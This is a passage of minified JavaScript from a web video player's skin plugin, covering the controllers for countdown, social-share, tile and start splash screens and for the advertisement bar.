s,this.onButtonClick)),this.hideSplash()},onVideoPaused:function(b){this.countdownEndView.button.removeEventListener("click",U(this,this.onButtonClick)),this.hideSplash()},fallbackToDefaultEndSplash:function(b){null==b&&(b=!1),this.active=!1,ec.prototype.fallbackToDefaultEndSplash.call(this,b)},onVideoComplete:function(b){this.disabled||(null!=this.mediaPlaylist&&this.mediaPlaylist.hasNext()?(this.active=!0,this.nextMedia=this.mediaPlaylist.items[this.mediaPlaylist.currentPos+1],null==this.nextMedia.title&&""==this.nextMedia.title||this.countdownEndView.title.set_text(this.nextMedia.title),this.setupImage(this.nextMedia),this.countdownEndView.button.addEventListener("click",U(this,this.onButtonClick)),this.showSplash()):this.fallbackToDefaultEndSplash(!0))},formatRestoreEndSplashData:function(){return{size:this.fallbackSize,name:this.name,mediaPlaylist:this.mediaPlaylist}},onResize:function(b){this.stopCountdown(),this.onResizeContent(),this.startCountdown()},start:function(){this.active&&!this.disabled&&this.startCountdown()},startCountdown:function(){this.stopCountdown(),this.updateCountdown(),this.timer=new Rb(1e3),this.timer.run=U(this,this.onCountdown)},stopCountdown:function(){this.counter=10,null!=this.timer&&this.timer.stop(),this.timer=null},onCountdown:function(){this.counter--,0==this.counter?(this.stopCountdown(),this.active&&this.onButtonClick()):this.updateCountdown()},updateCountdown:function(){this.countdownEndView.counter.set_text(""+this.counter),this.onResizeCounter()},onPlaylistData:function(b){null!=b&&null!=b.data&&(this.mediaPlaylist=fb.__cast(b.data,bb).clone(),this.mediaPlaylist.shift())},setupImage:function(b){this.imageUrl=null,null!=b.splashImages&&0<b.splashImages.length?this.imageUrl=this.findImageUrlInSet(b.splashImages):null!=b.posterImages&&0<b.posterImages.length&&(this.imageUrl=this.findImageUrlInSet(b.posterImages)),""==this.imageUrl&&(this.imageUrl=null)},loadImage:function(){this.countdownEndView.imageHolder.onLoadError=U(this,this.onImageLoadEnd),this.countdownEndView.imageHolder.onLoad=U(this,this.onImageLoaded);var b=this.countdownEndView.imageHolder.data!=this.imageUrl;b&&this.showImageSpinner(),this.countdownEndView.imageHolder.set_data(this.imageUrl),b||this.onImageLoaded()},onImageLoaded:function(){this.onImageLoadEnd(),null==this.countdownEndView||null==this.countdownEndView.imageContainer||this.countdownEndView.imageContainer.isNativeElementNull()||null==this.countdownEndView.imageHolder||this.countdownEndView.imageHolder.isNativeElementNull()||(null==this.originalImgSize&&(this.originalImgSize=this.countdownEndView.imageHolder.get_size()),this.onResizeImage())},onImageLoadEnd:function(){this.hideImageSpinner(),this.start()},findImageUrlInSet:function(b){return null==(b=jd.getBestFitFromSet(b,0|this.countdownEndView.imageHolder.calculateWidth(),0|this.countdownEndView.imageHolder.calculateHeight()))?null:b.url},onButtonClick:function(b){null!=this.nextMedia&&null!=this.nextMedia.mediaLandingPage&&""!=this.nextMedia.mediaLandingPage?this.goToLanding():this.playNextMedia()},goToLanding:function(){window.open(this.nextMedia.mediaLandingPage,"_self")},playNextMedia:function(){ec.prototype.playMedia.call(this,this.mediaPlaylist.next())},onResizeContent:function(){this.updateContentWidth(),this.onResizeLeftPanel(),this.onResizeRightPanel(),this.countdownEndView.root.update()},updateContentWidth:function(){null!=this.countdownEndView&&null!=this.countdownEndView.content&&(null==this.imageUrl?(this.countdownEndView.content.set_percentWidth(this.resizeDataCache.content.percentWidth),this.countdownEndView.content.set_maxWidth(this.resizeDataCache.content.maxWidth)):(this.countdownEndView.content.set_percentWidth(this.resizeDataWithImage.content.percentWidth),this.countdownEndView.content.set_maxWidth(this.resizeDataWithImage.content.maxWidth)))},showLeftPanel:function(){this.countdownEndView.leftPanel.visible=!0,this.countdownEndView.leftPanel.buildNativeElement(),this.countdownEndView.imageContainer.overflowHidden=!0,this.countdownEndView.imageContainer.visible=!0,this.countdownEndView.imageContainer.buildNativeElement(),this.countdownEndView.imageHolder.visible=!0,this.countdownEndView.imageHolder.buildNativeElement(),this.hideImageSpinner(),this.onResizeLeftPanel()},hideLeftPanel:function(){this.hideImageSpinner(),null!=this.countdownEndView.imageHolder&&(this.countdownEndView.imageHolder.visible=!1,this.countdownEndView.imageHolder.destroyNativeElement()),null!=this.countdownEndView.imageContainer&&(this.countdownEndView.imageContainer.visible=!1,this.countdownEndView.imageContainer.destroyNativeElement()),null!=this.countdownEndView.leftPanel&&(this.countdownEndView.leftPanel.visible=!1,this.countdownEndView.leftPanel.destroyNativeElement())},showImageSpinner:function(){this.countdownEndView.imageSpinner.visible=!0,this.countdownEndView.imageSpinner.buildNativeElement()},hideImageSpinner:function(){null!=this.countdownEndView.imageSpinner&&(this.countdownEndView.imageSpinner.visible=!1,this.countdownEndView.imageSpinner.destroyNativeElement())},onResizeLeftPanel:function(){this.updateLeftPanelWidth(),this.onResizeImage()},updateLeftPanelWidth:function(){null!=this.countdownEndView&&null!=this.countdownEndView.leftPanel&&(null==this.imageUrl?this.countdownEndView.leftPanel.set_percentWidth(this.resizeDataCache.leftPanel.percentWidth):this.countdownEndView.leftPanel.set_percentWidth(this.resizeDataWithImage.leftPanel.percentWidth))},onResizeImage:function(){null==this.originalImgSize||null==this.countdownEndView||null==this.countdownEndView.imageContainer||this.countdownEndView.imageContainer.isNativeElementNull()||null==this.countdownEndView.imageHolder||this.countdownEndView.imageHolder.isNativeElementNull()||(jd.fitIntoRectangle(this.countdownEndView.imageHolder,this.countdownEndView.imageContainer,this.originalImgSize[0],this.originalImgSize[1]),this.countdownEndView.imageHolder.redraw())},showRightPanel:function(){this.countdownEndView.rightPanel.overflowHidden=!0,this.countdownEndView.rightPanel.visible=!0,this.countdownEndView.rightPanel.buildNativeElement(),this.countdownEndView.title.visible=!0,this.countdownEndView.title.buildNativeElement(),this.countdownEndView.counter.visible=!0,this.countdownEndView.counter.buildNativeElement(),this.countdownEndView.button.visible=!0,this.countdownEndView.button.buildNativeElement(),this.onResizeRightPanel()},hideRightPanel:function(){null!=this.countdownEndView.rightPanel&&(this.countdownEndView.rightPanel.visible=!1,this.countdownEndView.rightPanel.destroyNativeElement()),null!=this.countdownEndView.title&&(this.countdownEndView.title.visible=!1,this.countdownEndView.title.destroyNativeElement()),null!=this.countdownEndView.counter&&(this.countdownEndView.counter.visible=!1,this.countdownEndView.counter.destroyNativeElement()),null!=this.countdownEndView.button&&(this.countdownEndView.button.removeEventListener("click",U(this,this.onButtonClick)),this.countdownEndView.button.visible=!1,this.countdownEndView.button.destroyNativeElement())},onResizeRightPanel:function(){this.updateRightPanelWidth(),this.onResizeCounter()},updateRightPanelWidth:function(){null!=this.countdownEndView&&null!=this.countdownEndView.rightPanel&&(null==this.imageUrl?this.countdownEndView.rightPanel.set_percentWidth(this.resizeDataCache.rightPanel.percentWidth):this.countdownEndView.rightPanel.set_percentWidth(this.resizeDataWithImage.rightPanel.percentWidth))},onResizeCounter:function(){this.countdownEndView.counter.set_left((this.countdownEndView.counter.parent.calculateWidth()-this.countdownEndView.counter.calculateTextWidth())/2),this.countdownEndView.counter.set_top(-this.countdownEndView.counter.calculateTextWidth()/2),this.countdownEndView.counter.update()},__class__:zd});var Wd=function(){Sc.call(this,""),this.useBackdrop=!0};wa["bs.player.plugin.skin.controller.element.splash.end.DefaultEndSplashController"]=Wd,Wd.__name__="bs.player.plugin.skin.controller.element.splash.end.DefaultEndSplashController",Wd.__super__=Sc,Wd.prototype=Ja(Sc.prototype,{defaultEndView:null,init:function(){this.defaultEndView=this.view,null!=this.defaultEndView.button&&(null!=this.defaultEndView.imageContainer&&(this.splashImageContainer=this.defaultEndView.imageContainer),null!=this.defaultEndView.image&&(this.splashImage=this.defaultEndView.image),this.defaultEndView.button.addEventListener("click",U(this,this.onBtnClick)),T.add(this.context,"bufferingStart",U(this,this.onVideoBuffering)),Sc.prototype.init.call(this))},destroy:function(){this.resetStateForReinit(),null!=this.defaultEndView&&this.defaultEndView.destroy(),T.remove(this.context,"bufferingStart",U(this,this.onVideoBuffering)),Sc.prototype.destroy.call(this)},showSplash:function(){if(null!=this.defaultEndView.button){var b=ka.getMonitor(this.context).currentMedia;null!=b&&b instanceof Ca?null!=b.streamEndThankYouImageUrl&&""!=b.streamEndThankYouImageUrl?this.showSplashImage(b.streamEndThankYouImageUrl):null!=b.splashImages&&0<b.splashImages.length?this.showSplashImage(this.findBestFittingImage(b.splashImages).url):this.hideSplashImage():this.hideSplashImage(),Sc.prototype.showSplash.call(this),this.disabled||(this.defaultEndView.button.visible=!(b instanceof Ca),this.buildRoot(!0),this.defaultEndView.button.buildNativeElement(),this.defaultEndView.imageContainer.buildNativeElement(),this.defaultEndView.image.buildNativeElement())}},hideSplash:function(){null!=this.defaultEndView.button&&(this.defaultEndView.button.visible=!1,this.defaultEndView.button.destroyNativeElement(),this.hideSplashImage(),this.destroyRoot(),Sc.prototype.hideSplash.call(this))},resetStateForReinit:function(){null!=this.defaultEndView&&null!=this.defaultEndView.button&&(this.defaultEndView.button.hasEventListener("click")&&this.defaultEndView.button.removeEventListener("click",U(this,this.onBtnClick)),this.defaultEndView.button.visible=!1),Sc.prototype.resetStateForReinit.call(this)},onVideoBuffering:function(b){this.hideSplash()},onVideoPlaying:function(b){this.hideSplash()},onVideoPaused:function(b){this.hideSplash()},onVideoComplete:function(b){var c=null!=b.data&&null!=b.data.isMediaSwitch&&b.data.isMediaSwitch;null!=b.data&&null!=b.data.media&&b.data.media instanceof xa||c||this.showSplash()},onBtnClick:function(b){b.stopPropagation(),new W("skinPlayPause").dispatch(this.context)},__class__:Wd});var Xd=function(b){ec.call(this,b),this.useBackdrop=!0};wa["bs.player.plugin.skin.controller.element.splash.end.SocialEndSplashController"]=Xd,Xd.__name__="bs.player.plugin.skin.controller.element.splash.end.SocialEndSplashController",Xd.__super__=ec,Xd.prototype=Ja(ec.prototype,{socialEndView:null,showConfig:null,init:function(){this.socialEndView=this.view,null!=this.socialEndView&&null!=this.socialEndView.embed&&null!=this.socialEndView.mail&&null!=this.socialEndView.facebook&&null!=this.socialEndView.twitter&&null!=this.socialEndView.linkedIn&&(ec.prototype.init.call(this),this.readShowConfig(),null==this.showConfig||""==this.showConfig?ec.prototype.fallbackToDefaultEndSplash.call(this):this.hideSplash())},destroy:function(){this.resetStateForReinit(),null!=this.socialEndView&&this.socialEndView.destroy(),ec.prototype.destroy.call(this)},resetStateForReinit:function(){null!=this.socialEndView&&(this.removeClickEvents(),this.hideSplash()),this.showConfig=null,na.remove(this.context,"resize",U(this,this.setVerticalPosition)),ec.prototype.resetStateForReinit.call(this)},showSplash:function(){if(null!=this.showConfig){var b=this.showConfig.toString().split(",");0<b.length&&(this.fallbackSize=new Vb(100*b.length,0))}ec.prototype.showSplash.call(this),this.updateButtons(),this.addClickEvents(),this.setVerticalPosition(),na.add(this.context,"resize",U(this,this.setVerticalPosition))},hideSplash:function(){null!=this.socialEndView.embed&&(this.socialEndView.embed.visible=!1,this.socialEndView.embed.destroyNativeElement()),null!=this.socialEndView.mail&&(this.socialEndView.mail.visible=!1,this.socialEndView.mail.destroyNativeElement()),null!=this.socialEndView.facebook&&(this.socialEndView.facebook.visible=!1,this.socialEndView.facebook.destroyNativeElement()),null!=this.socialEndView.twitter&&(this.socialEndView.twitter.visible=!1,this.socialEndView.twitter.destroyNativeElement()),null!=this.socialEndView.linkedIn&&(this.socialEndView.linkedIn.visible=!1,this.socialEndView.linkedIn.destroyNativeElement()),this.removeClickEvents(),na.remove(this.context,"resize",U(this,this.setVerticalPosition)),ec.prototype.hideSplash.call(this)},onVideoPlaying:function(b){this.hideSplash()},onVideoPaused:function(b){this.hideSplash()},onVideoComplete:function(b){this.showSplash()},isButtonVisible:function(b){return null!=this.showConfig&&-1<this.showConfig.indexOf(b.toLowerCase())},setVerticalPosition:function(b){var c=this.socialEndView.stage.calculateWidth(),d=0;b=0;for(var q=this.socialEndView.root.children;b<q.length;){var X=q[b];++b,X.visible&&(d+=X.calculateWidth())}for(c=(c-d)/2|0,b=d=0,q=this.socialEndView.root.children;b<q.length;)X=q[b],++b,X.visible&&(X.set_left(c+d),X.update(),d+=X.calculateWidth())},addClickEvents:function(){null!=this.socialEndView.embed&&this.socialEndView.embed.visible&&this.socialEndView.embed.addEventListener("click",U(this,this.getEmbedCode)),null!=this.socialEndView.mail&&this.socialEndView.mail.visible&&this.socialEndView.mail.addEventListener("click",uc.shareViaMail),null!=this.socialEndView.facebook&&this.socialEndView.facebook.visible&&this.socialEndView.facebook.addEventListener("click",uc.shareOnFacebook),null!=this.socialEndView.twitter&&this.socialEndView.twitter.visible&&this.socialEndView.twitter.addEventListener("click",uc.shareOnTwitter),null!=this.socialEndView.linkedIn&&this.socialEndView.linkedIn.visible&&this.socialEndView.linkedIn.addEventListener("click",uc.shareOnLinkedIn)},removeClickEvents:function(){null!=this.socialEndView.embed&&this.socialEndView.embed.hasEventListener("click")&&this.socialEndView.embed.removeEventListener("click",U(this,this.getEmbedCode)),null!=this.socialEndView.mail&&this.socialEndView.mail.hasEventListener("click")&&this.socialEndView.mail.removeEventListener("click",uc.shareViaMail),null!=this.socialEndView.facebook&&this.socialEndView.facebook.hasEventListener("click")&&this.socialEndView.facebook.removeEventListener("click",uc.shareOnFacebook),null!=this.socialEndView.twitter&&this.socialEndView.twitter.hasEventListener("click")&&this.socialEndView.twitter.removeEventListener("click",uc.shareOnTwitter),null!=this.socialEndView.linkedIn&&this.socialEndView.linkedIn.hasEventListener("click")&&this.socialEndView.linkedIn.removeEventListener("click",uc.shareOnLinkedIn)},getEmbedCode:function(b){uc.showEmbedCodeWindow(this.context,this.variables)},updateButtons:function(){this.socialEndView.embed.visible=this.isButtonVisible("embed"),this.socialEndView.mail.visible=this.isButtonVisible("mail"),this.socialEndView.facebook.visible=this.isButtonVisible("facebook"),this.socialEndView.twitter.visible=this.isButtonVisible("twitter"),this.socialEndView.linkedIn.visible=this.isButtonVisible("linkedIn"),this.socialEndView.embed.visible?this.socialEndView.embed.buildNativeElement():this.socialEndView.embed.destroyNativeElement(),this.socialEndView.mail.visible?this.socialEndView.mail.buildNativeElement():this.socialEndView.mail.destroyNativeElement(),this.socialEndView.facebook.visible?this.socialEndView.facebook.buildNativeElement():this.socialEndView.facebook.destroyNativeElement(),this.socialEndView.twitter.visible?this.socialEndView.twitter.buildNativeElement():this.socialEndView.twitter.destroyNativeElement(),this.socialEndView.linkedIn.visible?this.socialEndView.linkedIn.buildNativeElement():this.socialEndView.linkedIn.destroyNativeElement()},readShowConfig:function(b){this.showConfig=null==b?Ic.getConfigValue(this.variables,"shareButtons"):b,null!=this.showConfig&&"string"==typeof this.showConfig&&(this.showConfig=this.showConfig.toLowerCase())},__class__:Xd});var Ad=function(b){this.isActive=!1,ec.call(this,b),this.fallbackSize=new Vb(220,300),this.useBackdrop=!0};wa["bs.player.plugin.skin.controller.element.splash.end.TilesEndSplashController"]=Ad,Ad.__name__="bs.player.plugin.skin.controller.element.splash.end.TilesEndSplashController",Ad.__super__=ec,Ad.prototype=Ja(ec.prototype,{tilesEndView:null,isActive:null,init:function(){this.tilesEndView=this.view,null!=this.tilesEndView&&null!=this.tilesEndView.root&&null!=this.tilesEndView.box&&null!=this.tilesEndView.tiles&&null!=this.tilesEndView.itemRenderer&&null!=this.tilesEndView.gapRenderer&&(ec.prototype.init.call(this),aa.add(this.context,"mediaPlaylistData",U(this,this.onPlaylistData)),this.hideSplash())},destroy:function(){this.resetStateForReinit(),null!=this.tilesEndView&&this.tilesEndView.destroy(),ec.prototype.destroy.call(this)},resetStateForReinit:function(){this.isActive=!1,aa.remove(this.context,"mediaPlaylistData",U(this,this.onPlaylistData)),this.hideSplash(),ec.prototype.resetStateForReinit.call(this)},showSplash:function(){null!=this.tilesEndView.box&&(ec.prototype.showSplash.call(this),this.tilesEndView.box.visible=!0,this.tilesEndView.box.buildNativeElement())},hideSplash:function(){ec.prototype.hideSplash.call(this),null!=this.tilesEndView.box&&(this.tilesEndView.box.visible=!1,this.tilesEndView.box.destroyNativeElement())},onVideoPlaying:function(b){this.hideSplash()},onVideoPaused:function(b){this.hideSplash()},onVideoComplete:function(b){this.showSplash()},onPlaylistData:function(b){(b=fb.__cast(b.data,bb).clone()).shift(),b.hasNext()?(fb.__cast(this.tilesEndView.tiles,kb).onItemSelect=U(this,this.onItemSelect),this.tilesEndView.tiles.set_data(b.items)):ec.prototype.fallbackToDefaultEndSplash.call(this)},onItemSelect:function(b,c){b instanceof va&&(null!=b.mediaLandingPage&&""!=b.mediaLandingPage?window.open(b.mediaLandingPage,"_self"):ec.prototype.playMedia.call(this,b))},__class__:Ad});var ud=function(b){ec.call(this,b),this.showPauseIconForPC=this.isEndSplashShowing=this.isVideoPlaying=this.useBackdrop=!1};wa["bs.player.plugin.skin.controller.element.splash.start.DefaultStartSplashController"]=ud,ud.__name__="bs.player.plugin.skin.controller.element.splash.start.DefaultStartSplashController",ud.__super__=ec,ud.prototype=Ja(ec.prototype,{defaultStartView:null,isVideoPlaying:null,isEndSplashShowing:null,showPauseIconForPC:null,init:function(){this.defaultStartView=this.view,null!=this.defaultStartView.button&&(ec.prototype.init.call(this),this.showSplash(),T.add(this.context,"playing",U(this,this.onVideoPlaying)),T.add(this.context,"bufferingStart",U(this,this.onVideoBuffering)),T.add(this.context,"paused",U(this,this.onVideoPaused)),this.shouldBePauseIconAvailable()&&(W.add(this.context,"skinControlbarHidden",U(this,this.onControllbarHide)),W.add(this.context,"skinControlbarShow",U(this,this.onControllbarShow)),T.add(this.context,"videoCastingStart",U(this,this.onVideoCastingStart)),T.add(this.context,"videoCastingEnd",U(this,this.onVideoCastingEnd))),this.defaultStartView.button.addEventListener("click",U(this,this.onBtnClick)),null!=this.defaultStartView.pauseButton&&(this.defaultStartView.pauseButton.addEventListener("click",U(this,this.onBtnClick)),this.defaultStartView.pauseButton.visible=!1))},destroy:function(){T.remove(this.context,"playing",U(this,this.onVideoPlaying)),T.remove(this.context,"bufferingStart",U(this,this.onVideoBuffering)),T.remove(this.context,"paused",U(this,this.onVideoPaused)),this.shouldBePauseIconAvailable()&&(T.add(this.context,"videoCastingStart",U(this,this.onVideoCastingStart)),T.add(this.context,"videoCastingEnd",U(this,this.onVideoCastingEnd)),W.remove(this.context,"skinControlbarHidden",U(this,this.onControllbarHide)),W.remove(this.context,"skinControlbarShow",U(this,this.onControllbarShow))),null!=this.defaultStartView&&(null!=this.defaultStartView.button&&this.defaultStartView.button.hasEventListener("click")&&this.defaultStartView.button.removeEventListener("click",U(this,this.onBtnClick)),null!=this.defaultStartView.pauseButton&&this.defaultStartView.pauseButton.hasEventListener("click")&&this.defaultStartView.pauseButton.removeEventListener("click",U(this,this.onBtnClick)),this.defaultStartView.destroy()),ec.prototype.destroy.call(this)},showSplash:function(){this.isEndSplashShowing||null==this.defaultStartView.button||(ec.prototype.showSplash.call(this),this.defaultStartView.button.visible=!0,this.defaultStartView.button.buildNativeElement())},hideSplash:function(){ec.prototype.hideSplash.call(this),null!=this.defaultStartView.button&&(this.defaultStartView.button.visible=!1,this.defaultStartView.button.destroyNativeElement())},shouldBePauseIconAvailable:function(){if(h.mobile)return!0;var b=Ic.getConfigValue(this.variables,"videoCastEnabled");return null!=b&&b},shouldBePauseIconVisible:function(){return!!h.mobile||this.showPauseIconForPC},onVideoPlaying:function(b){this.isVideoPlaying=!0,this.isEndSplashShowing=!1,this.hideSplash(),this.enableMouse(),this.shouldBePauseIconVisible()&&!yc.getAvailability(this.context,Rc.SKIN)&&this.showPauseButton()},onVideoBuffering:function(b){this.hideSplash(),this.enableMouse()},onVideoPaused:function(b){this.isVideoPlaying=!1,this.shouldBePauseIconVisible()&&this.hidePauseButton(),this.showSplash()},onVideoComplete:function(b){this.isVideoPlaying=!1,this.isEndSplashShowing=!0,this.hideSplash(),this.shouldBePauseIconVisible()&&this.hidePauseButton()},onBtnClick:function(b){b.stopPropagation(),new W("skinPlayPause").dispatch(this.context)},onControllbarHide:function(b){null!=b&&null!=b.data&&b.data.isInitialCall||this.shouldBePauseIconVisible()&&(this.isVideoPlaying?this.hidePauseButton():this.hideSplash())},onControllbarShow:function(b){this.shouldBePauseIconVisible()&&(this.isVideoPlaying?this.showPauseButton():this.showSplash())},onVideoCastingStart:function(b){this.showPauseIconForPC=!0},onVideoCastingEnd:function(b){this.showPauseIconForPC=!1},disableMouse:function(b){null!=this.defaultStartView.button&&this.defaultStartView.button.mouseEnable&&(this.defaultStartView.button.mouseEnable=!1,this.defaultStartView.button.update())},enableMouse:function(){null==this.defaultStartView.button||this.defaultStartView.button.mouseEnable||(this.defaultStartView.button.mouseEnable=!0,this.defaultStartView.button.update())},showPauseButton:function(){null!=this.defaultStartView.pauseButton&&(this.view.root.visible=!0,this.buildRoot(),this.active=!0,this.defaultStartView.pauseButton.visible=!0,this.defaultStartView.pauseButton.buildNativeElement())},hidePauseButton:function(){null!=this.defaultStartView.pauseButton&&(this.defaultStartView.pauseButton.visible=!1,this.defaultStartView.pauseButton.destroyNativeElement(),this.view.root.visible=!1,this.destroyRoot())},__class__:ud});var Bd=function(){Sc.call(this,""),this.useBackdrop=!0,this.state="showing"};wa["bs.player.plugin.skin.controller.element.splash.start.SplashImageController"]=Bd,Bd.__name__="bs.player.plugin.skin.controller.element.splash.start.SplashImageController",Bd.__super__=Sc,Bd.prototype=Ja(Sc.prototype,{skinStyle:null,splashView:null,state:null,init:function(){Sc.prototype.init.call(this),null!=this.view&&(this.splashView=this.view,null!=this.splashView.root&&null!=this.splashView.image&&(this.splashImage=this.splashView.image,this.splashImageContainer=this.splashView.root,aa.add(this.context,"mediaMetadataData",U(this,this.onDataAdded)),T.add(this.context,"playing",U(this,this.onVideoPlaying)),Q.add(this.context,"adPlaying",U(this,this.onVideoPlaying)),T.add(this.context,"currentTimeChange",U(this,this.onVideoTimeupdate)),Q.add(this.context,"adCurrentTimeChange",U(this,this.onVideoTimeupdate)),h.isMobile()&&h.isiOS&&ma.addOnce(this.context,ma.DISABLE_MOUSE,U(this,this.disableMouse))))},destroy:function(){aa.remove(this.context,"mediaMetadataData",U(this,this.onDataAdded)),T.remove(this.context,"playing",U(this,this.onVideoPlaying)),Q.remove(this.context,"adPlaying",U(this,this.onVideoPlaying)),h.isMobile()&&h.isiOS&&ma.remove(this.context,ma.DISABLE_MOUSE,U(this,this.disableMouse)),Sc.prototype.destroy.call(this)},disableMouse:function(b){null!=this.splashView.image&&this.splashView.image.mouseEnable&&(this.splashView.root.mouseEnable=!1,this.splashView.image.mouseEnable=!1,this.splashView.root.update(),this.splashView.image.update())},enableMouse:function(){null==this.splashView.image||this.splashView.image.mouseEnable||(this.splashView.root.mouseEnable=!0,this.splashView.image.mouseEnable=!0,this.splashView.root.update(),this.splashView.image.update())},onDataAdded:function(b){null!=b.data.splashImages&&0<b.data.splashImages.length?(this.state="showing",this.showSplashImage(this.findBestFittingImage(b.data.splashImages).url),this.buildRoot(!0)):this.hideSplashImage()},showSplashForLoading:function(){var b=ka.getMonitor(this.context).currentMedia;null!=b&&b instanceof Ca&&null!=b.streamWaitingForTransmissionImageUrl&&""!=b.streamWaitingForTransmissionImageUrl&&(this.state="showingForLoading",this.showSplashImage(b.streamWaitingForTransmissionImageUrl),this.buildRoot(!0))},isLivestreamTransmissionWithSplash:function(){var b=ka.getMonitor(this.context).currentMedia;return null!=b&&b instanceof Ca&&null!=b.streamWaitingForTransmissionImageUrl&&""!=b.streamWaitingForTransmissionImageUrl},hideSplashImage:function(){this.state="hidding",Sc.prototype.hideSplashImage.call(this),this.destroyRoot(),this.enableMouse()},onVideoPlaying:function(b){null!=this.splashView&&null!=this.splashView.root&&null!=this.splashView.image&&(this.isLivestreamTransmissionWithSplash()?this.showSplashForLoading():this.hideSplashImage())},onVideoTimeupdate:function(b){"showingForLoading"==this.state&&this.hideSplashImage()},__class__:Bd});var Nd=function(){this.isMuted=this.showVpaidControls=this.isVpaid=this.isPaused=!1,zb.call(this)};wa["bs.player.plugin.skin.controller.element.window.AdvertisementsController"]=Nd,Nd.__name__="bs.player.plugin.skin.controller.element.window.AdvertisementsController",Nd.__super__=zb,Nd.prototype=Ja(zb.prototype,{adWasClicked:null,adView:null,adOnClickUrlShowTime:null,clickElement:null,isMuted:null,showVpaidControls:null,isVpaid:null,isPaused:null,init:function(){var b=!1;Object.prototype.hasOwnProperty.call(this.variables,"keepSkinOnAd")&&(b=1==m.field(this.variables,"keepSkinOnAd")),1!=b&&(zb.prototype.init.call(this),null!=this.view&&(this.adView=this.view,null!=this.adView.root&&null!=this.adView.bar&&null!=this.adView.title&&null!=this.adView.counter&&null!=this.adView.click&&(this.clickElement=this.adView.click,this.adWasClicked=!1,this.adOnClickUrlShowTime=null,this.adView.title.set_text(Yb.translate("advertisement_bar_title")),this.adView.set_width(200),Q.add(this.context,"adEnableControls",U(this,this.hide)),Q.add(this.context,"adDisableControls",U(this,this.show)),Q.add(this.context,"adBarShow",U(this,this.onAdBarShow)),Q.add(this.context,"adBarHide",U(this,this.onAdBarHide)),Q.add(this.context,"adInStreamClipPlaying",U(this,this.onAdInStreamStart)),aa.add(this.context,"adMetadataData",U(this,this.onAdStart)),W.addOnce(this.context,"skinMute",U(this,this.onMute)),W.addOnce(this.context,"skinUnmute",U(this,this.onUnmute)),Object.prototype.hasOwnProperty.call(this.variables,"advertisement")&&(b=m.field(this.variables,"advertisement"),Object.prototype.hasOwnProperty.call(b,"showVpaidControls")&&(this.showVpaidControls=1==m.field(b,"showVpaidControls"))),this.hide())))},destroy:function(){Q.remove(this.context,"adEnableControls",U(this,this.hide)),Q.remove(this.context,"adDisableControls",U(this,this.show)),Q.remove(this.context,"adBarShow",U(this,this.onAdBarShow)),Q.remove(this.context,"adBarHide",U(this,this.onAdBarHide)),Q.remove(this.context,"adInStreamClipPlaying",U(this,this.onAdInStreamStart)),aa.remove(this.context,"adMetadataData",U(this,this.onAdStart)),W.remove(this.context,"skinMute",U(this,this.onMute)),W.remove(this.context,"skinUnmute",U(this,this.onUnmute)),zb.prototype.destroy.call(this)},buildRoot:function(b){this.isViewRootBuild||null==this.view||null==this.view.root||(this.adWasClicked=!1,zb.prototype.buildRoot.call(this,!0),this.hideClose(),this.addClickEvents(),this.onAdPlayResume(),this.clickElement.mouseEnable=!0,this.adView.bar.mouseEnable=!0,this.clickElement.update(),this.isVpaid?(null!=this.adView.mute&&(this.adView.mute.mouseEnable=!1,this.adView.mute.visible=!1,this.adView.mute.destroyNativeElement()),this.adView.click.mouseEnable=!1,this.adView.click.visible=!1,this.adView.click.destroyNativeElement(),this.adView.root.visible=!1):(null!=this.adView.mute&&(this.adView.mute.mouseEnable=!0,this.adView.mute.visible=!0,this.adView.mute.update(),this.adView.mute.buildNativeElement(),this.adView.mute.currentStateName[1]=this.isMuted?"mute":"unmute",this.adView.mute.setStateName(this.adView.mute.currentStateName)),this.adView.root.visible=!0),this.adView.root.update())},destroyRoot:function(){this.isViewRootBuild&&null!=this.view&&null!=this.view.root&&(this.hideClose(),this.updateTime(null),this.updateCounter(0,0),this.removeClickEvents(),this.clickElement.mouseEnable=!1,this.clickElement.set_onClickUrl(null),this.clickElement.update(),this.adView.root.visible=!1,this.adView.root.update(),this.adView.bar.destroyNativeElement(),zb.prototype.destroyRoot.call(this))},onMute:function(b){this.isMuted=!0,null!=this.adView.mute&&(this.adView.mute.currentStateName[1]=this.isMuted?"mute":"unmute",this.adView.mute.setStateName(this.adView.mute.currentStateName)),W.remove(this.context,"skinUnmute",U(this,this.onUnmute))},onUnmute:function(b){this.isMuted=!1,null!=this.adView.mute&&(this.adView.mute.currentStateName[1]=this.isMuted?"mute":"unmute",this.adView.mute.setStateName(this.adView.mute.currentStateName)),W.remove(this.context,"skinMute",U(this,this.onMute))},show:function(b){this.adOnClickUrlShowTime=new Date,Q.add(this.context,"adGroupCurrentTimeChange",U(this,this.onTimeChange)),Q.add(this.context,"adSkipButtonShow",U(this,this.showClose)),Q.add(this.context,"adAdHide",U(this,this.showClose)),Q.add(this.context,"adPlaying",U(this,this.onAdPlayResume)),Q.add(this.context,"adPaused",U(this,this.onAdPause)),this.buildRoot()},hide:function(b){this.adWasClicked=!1,Q.remove(this.context,"adGroupCurrentTimeChange",U(this,this.onTimeChange)),Q.remove(this.context,"adSkipButtonShow",U(this,this.showClose)),Q.remove(this.context,"adPlaying",U(this,this.onAdPlayResume)),this.destroyRoot()},showClose:function(b){null!=this.adView.close&&(this.adView.close.visible=!0,this.adView.close.mouseEnable=!0,this.adView.close.buildNativeElement()),null!=this.adView.closeSpacer&&this.adView.closeSpacer.set_visible_with_redraw(!0),this.adView.root.update()},hideClose:function(){null!=this.adView.close&&(this.adView.close.visible=!1,this.adView.close.mouseEnable=!1),null!=this.adView.closeSpacer&&this.adView.closeSpacer.set_visible_with_redraw(!1),this.adView.root.update(),null!=this.adView.close&&this.adView.close.destroyNativeElement()},onAdPause:function(b){null!=this.adView.play&&(this.adView.play.mouseEnable=!0,this.adView.play.visible=!0),this.isPaused=!0,null!=this.adView.play&&this.adView.play.buildNativeElement()},onAdPlayResume:function(b){null!=this.adView.play&&(this.adView.play.mouseEnable=!1,this.adView.play.visible=!1),this.isPaused=!1,null!=this.adView.play&&this.adView.play.destroyNativeElement()},onAdBarShow:function(b){this.adView.bar.visible=!0,this.adView.bar.buildNativeElement(),this.isVpaid=!1},onAdBarHide:function(b){this.adView.bar.visible=!1,this.adView.bar.destroyNativeElement(),this.isVpaid=!0},updateTime:function(b){this.buildRoot(),null!=this.adView.time&&(null!=b&&0<=b?(this.adView.time.set_text(Yb.formatTime(b,!1)),this.adView.time.visible=!0):(this.adView.time.set_text(""),this.adView.time.visible=!1)),this.isPaused=!1},updateCounter:function(b,c){b==c&&1>=b?(this.adView.counter.visible=!1,this.adView.counter.set_text(""),this.adView.counter.destroyNativeElement()):(this.buildRoot(),this.adView.bar.bui